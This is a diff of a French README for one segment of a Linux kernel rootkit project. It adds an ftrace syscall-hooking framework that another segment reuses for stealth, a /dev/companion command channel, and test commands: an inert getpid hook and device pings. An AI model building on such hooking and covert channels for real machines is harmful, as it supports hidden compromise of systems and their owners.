@@ -12,10 +12,13 @@ implémenter.
 segment_b/
 ├── Makefile              # build out-of-tree, cibles all/clean/load/unload/reload/log
 ├── include/
-│   └── protocol.h        # format d'échange partagé noyau <-> userland
+│   ├── protocol.h        # format d'échange partagé noyau <-> userland
+│   ├── companion_dev.h   # API publique du canal de commande
+│   └── syscall_hook.h    # API publique du framework de hook ftrace
 ├── src/
-│   ├── module_core.c     # init/exit, cycle de vie du module
-│   └── companion_dev.c   # misc device /dev/companion + file_operations
+│   ├── module_core.c     # init/exit, cycle de vie, auto-test de hook
+│   ├── companion_dev.c   # misc device /dev/companion + file_operations
+│   └── syscall_hook.c    # framework de remplacement de syscall (ftrace)
 ├── docs/
 │   └── interface_contract.md  # contrat d'interface figé à J1
 └── README.md
@@ -57,6 +60,22 @@ rootkit_b: ready
 - **protocole** : `protocol.h` définit `cmd_request` (commande + argument)
   et `cmd_response` (statut + données), partagées entre noyau et userland.
   Voir `docs/interface_contract.md` pour le contrat figé.
+- **remplacement de syscall** : `syscall_hook.c` fournit un framework de hook
+  générique basé sur ftrace (`fh_install_hooks` / `fh_remove_hooks`) que le
+  segment C réutilise pour sa furtivité. B n'installe qu'un auto-test inerte,
+  désactivé par défaut. Jamais de hook sur `kill`.
+
+### Auto-test du mécanisme de hook
+
+```sh
+insmod rootkit_b.ko selftest=1   # installe un hook transparent sur getpid
+dmesg | tail                     # "hooked __x64_sys_getpid"
+rmmod rootkit_b                  # "self-test hook removed (N calls)"
+```
+
+Le hook appelle l'original et renvoie sa valeur inchangée : aucun effet
+visible, il prouve seulement que le remplacement fonctionne. Sans
+`selftest=1`, B n'installe aucun hook.
 
 ## État du protocole
 
@@ -74,12 +93,20 @@ Voir `docs/interface_contract.md` pour le détail des arguments et retours.
 
 ### Test rapide depuis l'espace utilisateur (en root dans la VM)
 
+La réponse est mise en file **par descripteur ouvert** : il faut écrire la
+requête et lire la réponse sur le **même** fd (write puis read sur deux
+ouvertures séparées perd la réponse).
+
 ```sh
-# CMD_PING : command=0x01, arg_len=0 -> 8 octets d'en-tête
-printf '\x01\x00\x00\x00\x00\x00\x00\x00' > /dev/companion
-# puis lire la réponse (status s32 + data_len u32)
-dd if=/dev/companion bs=8 count=1 2>/dev/null | xxd
+# CMD_PING : command=0x01, arg_len=0 -> 8 octets d'en-tête (little-endian)
+exec 3<>/dev/companion
+printf '\x01\x00\x00\x00\x00\x00\x00\x00' >&3
+dd bs=64 count=1 <&3 2>/dev/null | od -An -tx1   # -> status=0, data_len=0
+exec 3>&-
 ```
+
+Pour `CMD_GET_VERSION`, remplacer l'octet de commande par `\x02` : la
+réponse porte `status=0`, `data_len=5` puis `"0.1.0"`.
 
 (Le compagnon du segment D fournira l'outil propre pour sérialiser les
 requêtes ; la commande ci-dessus n'est qu'une vérification manuelle.)
